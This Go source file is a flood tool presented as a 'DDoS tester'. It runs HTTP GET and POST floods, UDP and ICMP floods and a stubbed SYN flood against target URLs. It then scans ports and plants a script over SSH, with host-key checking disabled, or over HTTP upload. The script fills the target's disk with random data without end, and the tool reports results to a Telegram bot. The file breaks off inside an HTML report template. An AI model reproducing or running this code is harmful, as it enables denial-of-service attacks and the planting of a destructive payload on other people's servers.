package ddos

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"ddos/internal/mail"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"gonum.org/v1/plot"
	"gonum.org/v1/plot/plotter"
	"gonum.org/v1/plot/plotutil"
	"gonum.org/v1/plot/vg"
)

// SessionDetail extends session info with status code and error message
type SessionDetail struct {
	Timestamp          time.Time
	Status             string
	StatusCode         int
	DurationMs         int64
	ErrorMsg           string
	URL                string
	ResponseHeaders    http.Header // store headers
	ResponseBodySample string      // store small snippet of body (optional)
}

type AttackStats struct {
	// Application Layer
	HTTPGetSent     int
	HTTPGetSuccess  int
	HTTPGetFailure  int
	HTTPPostSent    int
	HTTPPostSuccess int
	HTTPPostFailure int

	// Transport Layer
	TCPSynSent      int
	UDPPacketsSent  int
	ICMPPacketsSent int
}

// CycleData holds all session details for a cycle
type CycleData struct {
	Sessions []SessionDetail `json:"sessions"`
}

// DDoSTester manages a DDoS attack test run.
type DDoSTester struct {
	urls       []string
	workers    int
	mailer     *mail.Mailer
	toEmail    string
	tgBotToken string
	tgChatID   int64
	// Add fields for headers/payload if needed
}

// NewDDoSTester creates a new DDoSTester instance with multiple URLs and workers.
// Validates inputs and returns an error if any parameter is invalid.
func NewDDoSTester(
	urls []string,
	workers int,
	mailer *mail.Mailer,
	toEmail, tgBotToken string,
	tgChatID int64,
) (*DDoSTester, error) {
	if workers < 1 {
		return nil, fmt.Errorf("workers must be >= 1")
	}
	if len(urls) == 0 {
		return nil, fmt.Errorf("at least one target URL is required")
	}
	for _, u := range urls {
		if !strings.HasPrefix(u, "http://") && !strings.HasPrefix(u, "https://") {
			return nil, fmt.Errorf("invalid URL (missing scheme): %s", u)
		}
	}
	// mailer and toEmail can be optional now
	if tgBotToken == "" {
		return nil, fmt.Errorf("telegram bot token is required")
	}
	if tgChatID == 0 {
		return nil, fmt.Errorf("telegram chat ID is required")
	}

	return &DDoSTester{
		urls:       urls,
		workers:    workers,
		mailer:     mailer,
		toEmail:    toEmail,
		tgBotToken: tgBotToken,
		tgChatID:   tgChatID,
	}, nil
}

func (d *DDoSTester) tcpSynFlood(ctx context.Context, target string, duration time.Duration) {
	ipAddr, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		log.Printf("TCP SYN Flood: Failed to resolve IP for %s: %v", target, err)
		return
	}

	conn, err := net.Dial("ip4:tcp", ipAddr.String())
	if err != nil {
		log.Printf("TCP SYN Flood: Raw socket dial error: %v", err)
		return
	}
	defer conn.Close()

	end := time.Now().Add(duration)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			packet := buildTCPSynPacket(ipAddr.IP)
			_, err := conn.Write(packet)
			if err != nil {
				log.Printf("TCP SYN Flood: Write error: %v", err)
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}

func (d *DDoSTester) udpFlood(ctx context.Context, target string, port int, duration time.Duration) {
	addr := net.JoinHostPort(target, strconv.Itoa(port))
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		log.Printf("UDP Flood: Failed to resolve UDP addr %s: %v", addr, err)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Printf("UDP Flood: DialUDP error: %v", err)
		return
	}
	defer conn.Close()

	payload := make([]byte, 1024)
	rand.Read(payload)

	end := time.Now().Add(duration)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			_, err := conn.Write(payload)
			if err != nil {
				log.Printf("UDP Flood: Write error: %v", err)
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}

// RunCycle runs a single test cycle, performs HTTP GET requests
func (d *DDoSTester) RunCycle(ctx context.Context, duration time.Duration) ([]SessionDetail, AttackStats) {
	var mu sync.Mutex
	var sessions []SessionDetail
	stats := AttackStats{}

	cycleCtx, cancel := context.WithTimeout(ctx, duration)
	defer cancel()

	var wg sync.WaitGroup

	workersPerURL := d.workers / len(d.urls)
	if workersPerURL == 0 {
		workersPerURL = 1
	}

	for _, targetURL := range d.urls {
		for i := 0; i < workersPerURL; i++ {
			wg.Add(1)
			go func(url string) {
				defer wg.Done()
				client := &http.Client{Timeout: 10 * time.Second}
				for {
					select {
					case <-cycleCtx.Done():
						return
					default:
						mu.Lock()
						stats.HTTPGetSent++
						mu.Unlock()

						req, err := http.NewRequestWithContext(cycleCtx, "GET", url, nil)
						if err != nil {
							log.Printf("Failed to create request: %v", err)
							return
						}
						start := time.Now()
						resp, err := client.Do(req)
						durationMs := time.Since(start).Milliseconds()
						sd := SessionDetail{
							Timestamp:  time.Now(),
							DurationMs: durationMs,
							URL:        url,
						}
						if err != nil {
							sd.Status = "failure"
							sd.ErrorMsg = err.Error()
							mu.Lock()
							stats.HTTPGetFailure++
							mu.Unlock()
						} else {
							sd.StatusCode = resp.StatusCode
							if resp.StatusCode >= 200 && resp.StatusCode < 300 {
								sd.Status = "success"
								mu.Lock()
								stats.HTTPGetSuccess++
								mu.Unlock()
							} else {
								sd.Status = "failure"
								sd.ErrorMsg = fmt.Sprintf("HTTP %d", resp.StatusCode)
								mu.Lock()
								stats.HTTPGetFailure++
								mu.Unlock()
							}
							io.Copy(ioutil.Discard, resp.Body)
							resp.Body.Close()
						}
						mu.Lock()
						sessions = append(sessions, sd)
						mu.Unlock()
						runtime.Gosched()
					}
				}
			}(targetURL)
		}

		// TCP SYN flood
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			d.tcpSynFloodWithStats(cycleCtx, target, duration, &stats)
		}(extractHostname(targetURL))

		// UDP flood
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			d.udpFloodWithStats(cycleCtx, target, 80, duration, &stats)
		}(extractHostname(targetURL))

		// ICMP flood
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			d.icmpFloodWithStats(cycleCtx, target, duration, &stats)
		}(extractHostname(targetURL))

		// HTTP POST flood
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			d.httpPostFloodWithStats(cycleCtx, url, duration, &stats)
		}(targetURL)
	}

	wg.Wait()
	return sessions, stats
}

func (d *DDoSTester) udpFloodWithStats(ctx context.Context, target string, port int, duration time.Duration, stats *AttackStats) {
	addr := net.JoinHostPort(target, strconv.Itoa(port))
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		log.Printf("UDP Flood: Failed to resolve UDP addr %s: %v", addr, err)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Printf("UDP Flood: DialUDP error: %v", err)
		return
	}
	defer conn.Close()

	payload := make([]byte, 1024)
	rand.Read(payload)

	end := time.Now().Add(duration)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			_, err := conn.Write(payload)
			if err != nil {
				log.Printf("UDP Flood: Write error: %v", err)
			} else {
				stats.UDPPacketsSent++
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}

func (d *DDoSTester) httpPostFloodWithStats(ctx context.Context, targetUrl string, duration time.Duration, stats *AttackStats) {
	client := &http.Client{Timeout: 10 * time.Second}
	end := time.Now().Add(duration)

	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			form := url.Values{}
			form.Set("username", randomString(8))
			form.Set("email", randomString(5)+"@example.com")
			form.Set("message", randomString(20))

			req, err := http.NewRequestWithContext(ctx, "POST", targetUrl, strings.NewReader(form.Encode()))
			if err != nil {
				log.Printf("HTTP POST Flood: NewRequest error: %v", err)
				continue
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			stats.HTTPPostSent++

			resp, err := client.Do(req)
			if err != nil {
				log.Printf("HTTP POST Flood: Request error: %v", err)
				stats.HTTPPostFailure++
				continue
			}
			io.Copy(ioutil.Discard, resp.Body)
			resp.Body.Close()

			if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				stats.HTTPPostSuccess++
			} else {
				stats.HTTPPostFailure++
			}

			time.Sleep(10 * time.Millisecond) // Adjust as needed
		}
	}
}

func (d *DDoSTester) icmpFloodWithStats(ctx context.Context, target string, duration time.Duration, stats *AttackStats) {
	ipAddr, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		log.Printf("ICMP Flood: Failed to resolve IP %s: %v", target, err)
		return
	}

	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Printf("ICMP Flood: ListenPacket error: %v", err)
		return
	}
	defer c.Close()

	end := time.Now().Add(duration)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			msg := icmp.Message{
				Type: ipv4.ICMPTypeEcho,
				Code: 0,
				Body: &icmp.Echo{
					ID:   rand.Intn(0xffff),
					Seq:  rand.Intn(0xffff),
					Data: []byte("DDoS Test Ping"),
				},
			}
			b, err := msg.Marshal(nil)
			if err != nil {
				log.Printf("ICMP Flood: Marshal error: %v", err)
				continue
			}
			_, err = c.WriteTo(b, ipAddr)
			if err != nil {
				log.Printf("ICMP Flood: WriteTo error: %v", err)
			} else {
				stats.ICMPPacketsSent++
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}

func extractHostname(rawurl string) string {
	u, err := url.Parse(rawurl)
	if err != nil {
		return rawurl
	}
	return u.Hostname()
}

func (d *DDoSTester) icmpFlood(ctx context.Context, target string, duration time.Duration) {
	ipAddr, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		log.Printf("ICMP Flood: Failed to resolve IP %s: %v", target, err)
		return
	}

	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Printf("ICMP Flood: ListenPacket error: %v", err)
		return
	}
	defer c.Close()

	end := time.Now().Add(duration)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			msg := icmp.Message{
				Type: ipv4.ICMPTypeEcho,
				Code: 0,
				Body: &icmp.Echo{
					ID:   rand.Intn(0xffff),
					Seq:  rand.Intn(0xffff),
					Data: []byte("DDoS Test Ping"),
				},
			}
			b, err := msg.Marshal(nil)
			if err != nil {
				log.Printf("ICMP Flood: Marshal error: %v", err)
				continue
			}
			_, err = c.WriteTo(b, ipAddr)
			if err != nil {
				log.Printf("ICMP Flood: WriteTo error: %v", err)
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}

// HTTP POST Flood (Spam bot simulation)
func (d *DDoSTester) httpPostFlood(ctx context.Context, targetUrl string, duration time.Duration) {
	client := &http.Client{Timeout: 10 * time.Second}
	end := time.Now().Add(duration)

	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			form := url.Values{}
			form.Set("username", randomString(8))
			form.Set("email", randomString(5)+"@example.com")
			form.Set("message", randomString(20))

			req, err := http.NewRequestWithContext(ctx, "POST", targetUrl, strings.NewReader(form.Encode()))
			if err != nil {
				log.Printf("HTTP POST Flood: NewRequest error: %v", err)
				continue
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			resp, err := client.Do(req)
			if err != nil {
				log.Printf("HTTP POST Flood: Request error: %v", err)
				continue
			}
			io.Copy(ioutil.Discard, resp.Body)
			resp.Body.Close()

			time.Sleep(10 * time.Millisecond) // Adjust as needed
		}
	}
}

// Helper to generate random string
func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Placeholder for TCP SYN packet builder - requires full TCP/IP header crafting
func buildTCPSynPacket(dstIP net.IP) []byte {
	// Implement raw packet crafting here
	// This is complex and requires checksum calculations
	return []byte{}
}

func (d *DDoSTester) tcpSynFloodWithStats(ctx context.Context, target string, duration time.Duration, stats *AttackStats) {
	ipAddr, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		log.Printf("TCP SYN Flood: Failed to resolve IP for %s: %v", target, err)
		return
	}

	conn, err := net.Dial("ip4:tcp", ipAddr.String())
	if err != nil {
		log.Printf("TCP SYN Flood: Raw socket dial error: %v", err)
		return
	}
	defer conn.Close()

	end := time.Now().Add(duration)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
			packet := buildTCPSynPacket(ipAddr.IP)
			_, err := conn.Write(packet)
			if err != nil {
				log.Printf("TCP SYN Flood: Write error: %v", err)
			} else {
				stats.TCPSynSent++
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}

func findOpenPort(target string, ports []int, timeout time.Duration) (int, error) {
	for _, port := range ports {
		addr := fmt.Sprintf("%s:%d", target, port)
		conn, err := net.DialTimeout("tcp", addr, timeout)
		if err == nil {
			conn.Close()
			return port, nil
		}
	}
	return 0, fmt.Errorf("no open port found")
}

func (d *DDoSTester) uploadPayloadHTTP(target string, port int, payload []byte) (int, int64, error) {
	scheme := "http"
	if port == 443 {
		scheme = "https"
	}

	// Adjust this path to your server's upload endpoint
	uploadURL := fmt.Sprintf("%s://%s:%d/upload", scheme, target, port)

	req, err := http.NewRequest("POST", uploadURL, bytes.NewReader(payload))
	if err != nil {
		return 0, 0, fmt.Errorf("failed to create upload request: %w", err)
	}
	req.Header.Set("Content-Type", "text/plain")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return 0, 0, fmt.Errorf("upload request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK {
		return 0, 0, fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(body))
	}

	log.Printf("Payload uploaded successfully via HTTP to %s", uploadURL)
	return 1, int64(len(payload)), nil
}

func (d *DDoSTester) uploadPayloadSSH(target string, payload []byte) (int, int64, error) {
	// TODO: Replace with your SSH username and private key or password
	sshUser := "your_ssh_user"
	sshPassword := "your_ssh_password" // or use private key auth

	config := &ssh.ClientConfig{
		User: sshUser,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPassword),
			// Or use ssh.PublicKeys(...) for key auth
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	addr := fmt.Sprintf("%s:22", target)
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return 0, 0, fmt.Errorf("ssh dial error: %w", err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return 0, 0, fmt.Errorf("ssh new session error: %w", err)
	}
	defer session.Close()

	// Upload payload via echo or cat
	remotePath := "/tmp/payload.sh"
	cmd := fmt.Sprintf("cat > %s && chmod +x %s && nohup %s &", remotePath, remotePath, remotePath)

	stdin, err := session.StdinPipe()
	if err != nil {
		return 0, 0, fmt.Errorf("ssh stdin pipe error: %w", err)
	}

	if err := session.Start(cmd); err != nil {
		return 0, 0, fmt.Errorf("ssh start command error: %w", err)
	}

	_, err = stdin.Write(payload)
	if err != nil {
		return 0, 0, fmt.Errorf("ssh write payload error: %w", err)
	}
	stdin.Close()

	if err := session.Wait(); err != nil {
		return 0, 0, fmt.Errorf("ssh command wait error: %w", err)
	}

	log.Printf("Payload uploaded and executed via SSH on %s", target)
	return 1, int64(len(payload)), nil
}

func (d *DDoSTester) DeployPayload(target string) (int, int64, error) {
	// Define ports to check and upload methods
	portsToCheck := []int{22, 80, 443}

	// Payload script content
	payloadScript := `#!/bin/bash
JUNK_FILE="/tmp/junkfile.log"
while true; do
  head -c 1000000 /dev/urandom >> "$JUNK_FILE"
  sleep 0.1
done
`
	payloadBytes := []byte(payloadScript)

	// Scan ports for open services
	var openPort int
	for _, port := range portsToCheck {
		addr := fmt.Sprintf("%s:%d", target, port)
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err == nil {
			conn.Close()
			openPort = port
			break
		}
	}
	if openPort == 0 {
		return 0, 0, fmt.Errorf("no suitable open port found on %s", target)
	}

	log.Printf("DeployPayload: open port %d found on %s", openPort, target)

	switch openPort {
	case 22:
		// SSH upload and execute
		deployed, bytesSent, err := d.uploadPayloadSSH(target, payloadBytes)
		return deployed, bytesSent, err
	case 80, 443:
		// HTTP upload
		deployed, bytesSent, err := d.uploadPayloadHTTP(target, openPort, payloadBytes)
		return deployed, bytesSent, err
	default:
		return 0, 0, fmt.Errorf("no upload method for port %d", openPort)
	}
}

func (d *DDoSTester) SendPayloadDeploymentReport(target string, deployedCount int, totalBytes int64, err error) error {
	var message string
	if err != nil {
		message = fmt.Sprintf("❌ Payload deployment FAILED on %s\nError: %v", target, err)
	} else {
		message = fmt.Sprintf("✅ Payload deployment SUCCESS on %s\nPayloads deployed: %d\nTotal data sent: %.2f MB",
			target, deployedCount, float64(totalBytes)/(1024*1024))
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", d.tgBotToken)
	data := url.Values{}
	data.Set("chat_id", strconv.FormatInt(d.tgChatID, 10))
	data.Set("text", message)
	data.Set("parse_mode", "Markdown")

	resp, err := http.PostForm(apiURL, data)
	if err != nil {
		return fmt.Errorf("failed to send telegram message: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s", string(body))
	}
	return nil
}

// RunScheduled runs the test for cycles and intervals, generates report, sends email and Telegram message
func (d *DDoSTester) RunScheduled(ctx context.Context, interval time.Duration, cycles int) error {
	var allCycles []CycleData
	var totalStats AttackStats

	firstRequest := time.Time{}
	lastRequest := time.Time{}

	for i := 0; i < cycles; i++ {
		log.Printf("Starting cycle %d/%d", i+1, cycles)
		start := time.Now()
		sessions, stats := d.RunCycle(ctx, interval)
		if len(sessions) == 0 {
			log.Printf("No sessions recorded for cycle %d", i+1)
			continue
		}

		for _, s := range sessions {
			if firstRequest.IsZero() || s.Timestamp.Before(firstRequest) {
				firstRequest = s.Timestamp
			}
			if lastRequest.IsZero() || s.Timestamp.After(lastRequest) {
				lastRequest = s.Timestamp
			}
		}

		totalStats.HTTPGetSent += stats.HTTPGetSent
		totalStats.HTTPGetSuccess += stats.HTTPGetSuccess
		totalStats.HTTPGetFailure += stats.HTTPGetFailure
		totalStats.HTTPPostSent += stats.HTTPPostSent
		totalStats.HTTPPostSuccess += stats.HTTPPostSuccess
		totalStats.HTTPPostFailure += stats.HTTPPostFailure
		totalStats.TCPSynSent += stats.TCPSynSent
		totalStats.UDPPacketsSent += stats.UDPPacketsSent
		totalStats.ICMPPacketsSent += stats.ICMPPacketsSent

		allCycles = append(allCycles, CycleData{Sessions: sessions})

		elapsed := time.Since(start)
		if elapsed < interval && i < cycles-1 {
			time.Sleep(interval - elapsed)
		}

		for _, url := range d.urls {
			host := extractHostname(url)
			deployedCount, totalBytes, err := d.DeployPayload(host)
			if err != nil {
				log.Printf("DeployPayload error for %s: %v", host, err)
			} else {
				log.Printf("Payload deployed on %s: %d payload(s), %.2f MB sent", host, deployedCount, float64(totalBytes)/(1024*1024))
			}

			if err := d.SendPayloadDeploymentReport(host, deployedCount, totalBytes, err); err != nil {
				log.Printf("Failed to send Telegram deployment report: %v", err)
			}
		}

	}

	_, summary := GenerateDetailedReport(allCycles, firstRequest, lastRequest, d.workers, interval, d.urls)

	summary["HTTPGetSent"] = totalStats.HTTPGetSent
	summary["HTTPGetSuccess"] = totalStats.HTTPGetSuccess
	summary["HTTPGetFailure"] = totalStats.HTTPGetFailure
	summary["HTTPPostSent"] = totalStats.HTTPPostSent
	summary["HTTPPostSuccess"] = totalStats.HTTPPostSuccess
	summary["HTTPPostFailure"] = totalStats.HTTPPostFailure
	summary["TCPSynSent"] = totalStats.TCPSynSent
	summary["UDPPacketsSent"] = totalStats.UDPPacketsSent
	summary["ICMPPacketsSent"] = totalStats.ICMPPacketsSent

	telegramMessage := GenerateTelegramReport(summary)

	log.Printf("Preparing to send Telegram message to chat ID %d...", d.tgChatID)
	log.Printf("Telegram message content:\n%s", telegramMessage)

	err := d.SendTelegramMessage(telegramMessage)
	if err != nil {
		log.Printf("Failed to send Telegram message: %v", err)
	} else {
		log.Println("Telegram message sent successfully.")
	}

	return nil
}

// GenerateSuccessFailureChartPerURL generates a bar chart of successes and failures per URL
func GenerateSuccessFailureChartPerURL(
	cycles []CycleData,
	urls []string,
) (string, string, error) {
	successCounts := make(plotter.Values, len(urls))
	failureCounts := make(plotter.Values, len(urls))

	for _, cycle := range cycles {
		for _, s := range cycle.Sessions {
			for i, url := range urls {
				if s.URL == url {
					if s.Status == "success" {
						successCounts[i]++
					} else {
						failureCounts[i]++
					}
					break
				}
			}
		}
	}

	p := plot.New()
	p.Title.Text = "Success vs Failure per Target URL"
	p.Y.Label.Text = "Count"

	w := vg.Points(20)

	barsSuccess, err := plotter.NewBarChart(successCounts, w)
	if err != nil {
		return "", "", err
	}
	barsSuccess.Color = plotutil.Color(0)

	barsFailure, err := plotter.NewBarChart(failureCounts, w)
	if err != nil {
		return "", "", err
	}
	barsFailure.Color = plotutil.Color(1)
	barsFailure.Offset = w

	p.Add(barsSuccess, barsFailure)
	p.Legend.Add("Success", barsSuccess)
	p.Legend.Add("Failure", barsFailure)

	labels := make([]string, len(urls))
	for i := range urls {
		labels[i] = fmt.Sprintf("Target %d", i+1)
	}
	p.NominalX(labels...)

	chartPath := "./logs/success_failure_chart.png"
	if err := p.Save(8*vg.Inch, 4*vg.Inch, chartPath); err != nil {
		return "", "", err
	}

	imgBytes, err := os.ReadFile(chartPath)
	if err != nil {
		return "", "", err
	}
	imgBase64 := base64.StdEncoding.EncodeToString(imgBytes)

	return chartPath, imgBase64, nil
}

// GenerateDetailedReport computes all requested metrics and returns JSON report + summary map
func GenerateDetailedReport(
	cycles []CycleData,
	first, last time.Time,
	workers int,
	duration time.Duration,
	urls []string,
) (string, map[string]interface{}) {
	var allDurations []float64
	totalRequests := 0
	successfulResponses := 0
	failedResponses := 0
	timeouts := 0
	connErrors := 0
	rateLimited := 0
	blocked := 0
	serverErrors := 0
	redirects := 0

	firewallDetected := false
	rateLimitingActive := false
	serverRecoveryDetected := false

	for _, cycle := range cycles {
		for _, s := range cycle.Sessions {
			totalRequests++
			allDurations = append(allDurations, float64(s.DurationMs))

			if s.Status == "success" {
				successfulResponses++
			} else {
				failedResponses++
				errLower := strings.ToLower(s.ErrorMsg)
				switch {
				case strings.Contains(errLower, "timeout"):
					timeouts++
				case strings.Contains(errLower, "connection refused") ||
					strings.Contains(errLower, "connection reset") ||
					strings.Contains(errLower, "tls handshake"):
					connErrors++
				case s.StatusCode == 429:
					rateLimited++
					rateLimitingActive = true
				case s.StatusCode == 403:
					blocked++
					firewallDetected = true
				case s.StatusCode >= 500:
					serverErrors++
				case s.StatusCode == 301 || s.StatusCode == 302:
					redirects++
				}
			}
		}
	}

	successRate := 0.0
	if totalRequests > 0 {
		successRate = float64(successfulResponses) / float64(totalRequests) * 100
	}

	sort.Float64s(allDurations)
	avgResponseTime := average(allDurations)
	medianResponseTime := median(allDurations)
	stdDevResponseTime := stdDev(allDurations)
	fastestResponseTime := 0.0
	slowestResponseTime := 0.0
	if len(allDurations) > 0 {
		fastestResponseTime = allDurations[0]
		slowestResponseTime = allDurations[len(allDurations)-1]
	}

	ddosResistanceScore := successRate // Simplified heuristic
	estimatedThreshold := float64(workers) * (successRate / 100)

	loadClass := "Low"
	if workers > 100 && successRate > 90 {
		loadClass = "Medium"
	}
	if workers > 500 && successRate > 80 {
		loadClass = "High"
	}

	behaviorCurve := "Stable"
	if serverErrors > 10 {
		behaviorCurve = "Unstable"
		serverRecoveryDetected = true
	}

	summary := map[string]interface{}{
		"WorkersSpawned":                   workers,
		"ConcurrencyLevel":                 workers,
		"TestDuration":                     duration.String(),
		"TargetEndpoints":                  urls,
		"PayloadSize":                      0,
		"HeadersCustomTokens":              "N/A",
		"TotalRequestsSent":                totalRequests,
		"SuccessfulResponses":              successfulResponses,
		"FailedResponses":                  failedResponses,
		"Timeouts":                         timeouts,
		"ConnectionErrors":                 connErrors,
		"RateLimitedResponses":             rateLimited,
		"BlockedResponses":                 blocked,
		"ServerErrors":                     serverErrors,
		"Redirects":                        redirects,
		"SuccessRatePercent":               successRate,
		"AverageResponseTimeMs":            avgResponseTime,
		"FastestResponseTimeMs":            fastestResponseTime,
		"SlowestResponseTimeMs":            slowestResponseTime,
		"MedianResponseTimeMs":             medianResponseTime,
		"StandardDeviationMs":              stdDevResponseTime,
		"DDoSResistanceScore":              ddosResistanceScore,
		"EstimatedThresholdBeforeCollapse": estimatedThreshold,
		"LoadClass":                        loadClass,
		"FirewallProtectionDetected":       firewallDetected,
		"RateLimitingActive":               rateLimitingActive,
		"BehaviorCurve":                    behaviorCurve,
		"ServerRecoveryDetected":           serverRecoveryDetected,
		"SummaryVerdict": generateSummaryVerdict(
			successRate,
			firewallDetected,
			rateLimitingActive,
		),
	}

	reportJSON, _ := json.MarshalIndent(summary, "", " ")
	return string(reportJSON), summary
}

// Helper functions for statistics

func average(data []float64) float64 {
	if len(data) == 0 {
		return 0
	}
	sum := 0.0
	for _, v := range data {
		sum += v
	}
	return sum / float64(len(data))
}

func median(data []float64) float64 {
	n := len(data)
	if n == 0 {
		return 0
	}
	if n%2 == 1 {
		return data[n/2]
	}
	return (data[n/2-1] + data[n/2]) / 2
}

func stdDev(data []float64) float64 {
	if len(data) == 0 {
		return 0
	}
	mean := average(data)
	var variance float64
	for _, v := range data {
		variance += (v - mean) * (v - mean)
	}
	variance /= float64(len(data))
	return math.Sqrt(variance)
}

func generateSummaryVerdict(
	successRate float64,
	firewallDetected, rateLimitingActive bool,
) string {
	if successRate > 95 && !firewallDetected && !rateLimitingActive {
		return "Excellent: System is highly resilient to DDoS attacks."
	}
	if firewallDetected || rateLimitingActive {
		return "Good: System has active protections like a firewall or rate limiting enabled, effectively mitigating some attacks."
	}
	if successRate < 50 {
		return "Critical: System is vulnerable to DDoS attacks and requires immediate mitigation."
	}
	return "Moderate: System shows some resilience, but further optimization and protection measures are recommended."
}

// GenerateDetailedEmailHTML formats the detailed summary into an HTML email
func GenerateDetailedEmailHTML(summary map[string]interface{}, chartBase64 string) string {
	targetURLs := summary["TargetEndpoints"].([]string)

	firewallStr := "No"
	if summary["FirewallProtectionDetected"].(bool) {
		firewallStr = "Yes"
	}
	rateLimitStr := "No"
	if summary["RateLimitingActive"].(bool) {
		rateLimitStr = "Yes"
	}
	serverRecoveryStr := "No"
	if summary["ServerRecoveryDetected"].(bool) {
		serverRecoveryStr = "Yes"
	}

	return fmt.Sprintf(`
<!DOCTYPE html>
<html>
<head>
<style>
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d0d0d; color: #e0e0e0; padding: 20px; line-height: 1.6;}
.container { max-width: 750px; background: #1a1a1a; padding: 30px; border-radius: 8px; margin: auto; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4); }
h1 { text-align: center; color: #f0f0f0; margin-bottom: 25px; }
h2, h3 { color: #f0f0f0; border-bottom: 1px solid #333; padding-bottom: 5px; margin-top: 25px;}
p { margin-bottom: 10px; }
ul { list-style-type: disc; margin-left: 20px; padding: 0; }
li { margin-bottom: 5px; }
table { width: 100%%; border-collapse: collapse; margin-top: 20px; border: 1px solid #333; }
th, td { border: 1px solid #333; padding: 12px; text-align: left; vertical-align: top;}
th { background-color: #2a2a2a; color: #f0f0f0; font-weight: bold; }
tr:nth-child(even) { background-color: #202020; }
tr:hover { background-color: #282828; }
.highlight { color: #8aff8a; font-weight: bold; } /* For success/positive metrics */
.warning { color: #ffd700; font-weight: bold; } /* For moderate/warning metrics */
.danger { color: #ff6b6b; font-weight: bold; } /* For failure/critical metrics */
.verdict { font-size: 1.1em; text-align: center; margin-top: 30px; padding: 15px; border-radius: 5px; background-color: #2a2a2a; border: 1px solid #444;}
.chart-section { text-align: center; margin-top: 30px; background-color: #2a2a2a; padding: 20px; border-radius: 8px;}
.footer { margin-top: 40px; font-size: 11px; color: #888; text-align: center; border-top: 1px solid #333; padding-top: 15px;}
</style>
</head>
<body>
<div class="container">
<h1>Black Synth - DDoS Test Report</h1>
<p>The DDoS test on the following target(s) has completed. Below is a detailed summary of the findings:</p>
<ul>%s</ul>


<h2>Key Metrics Overview</h2>
<table>
<tr><th>Metric</th><th>Value</th></tr>
<tr><td>Test Duration</td><td>%s</td></tr>
<tr><td>Workers Spawned</td><td>%d</td></tr>
<tr><td>Concurrency Level</td><td>%d</td></tr>
<tr><td>Total Requests Sent</td><td>%d</td></tr>
<tr><td>Successful Responses</td><td><span class="highlight">%d</span></td></tr>
<tr><td>Failed Responses</td><td><span class="danger">%d</span></td></tr>
<tr><td>Success Rate (%)</td><td><span class="%s">%.2f%%</span></td></tr>
<tr><td>Average Response Time (ms)</td><td>%.2f</td></tr>
<tr><td>Median Response Time (ms)</td><td>%.2f</td></tr>
<tr><td>DDoS Resistance Score (%)</td><td><span class="%s">%.2f%%</span></td></tr>
<tr><td>Estimated Threshold Before Collapse</td><td>%.2f</td></tr>
<tr><td>Load Class</td><td>%s</td></tr>
</table>


<h2>Detailed Breakdown of Failures</h2>
<table>
<tr><th>Failure Type</th><th>Count</th></tr>
<tr><td>Timeouts</td><td>%d</td></tr>
<tr><td>Connection Errors</td><td>%d</td></tr>
<tr><td>Rate-Limited Responses (HTTP 429)</td><td><span class="%s">%d</span></td></tr>
<tr><td>Blocked Responses (HTTP 403)</td><td><span class="%s">%d</span></td></tr>
<tr><td>Server Errors (HTTP 500+)</td><td><span class="%s">%d</span></td></tr>
<tr><td>Redirects (HTTP 301/302)</td><td>%d</td></tr>
</table>


<h2>System Behavior Analysis</h2>
<table>
